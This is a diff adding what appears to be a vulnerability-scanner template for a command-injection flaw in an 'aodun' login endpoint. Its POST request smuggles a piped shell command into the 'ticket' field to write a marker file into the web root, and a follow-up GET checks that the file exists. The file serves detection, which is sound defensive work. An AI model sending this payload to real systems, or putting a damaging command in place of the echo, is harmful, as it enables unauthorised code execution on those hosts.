@@ -1,0 +1,17 @@
+cve-id: aodun-sichuan_login-rce
+set:
+  file_content: randomLowercase(7)
+  file_name: randomLowercase(8)
+rules:
+- method: POST
+  path: /user_management/sichuan_login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip, deflate
+  body: |
+    loginname=sysadmin&ticket=|echo%20{{file_content}}>/adm/isms_web/static/base_static/js/aodun/{{file_name}}.txt
+- method: GET
+  path: /static/base_static/js/aodun/{{file_name}}.txt
+  expression: 'response.body.bcontains(b"{{file_content}}")'
+severity: high
+type: rce
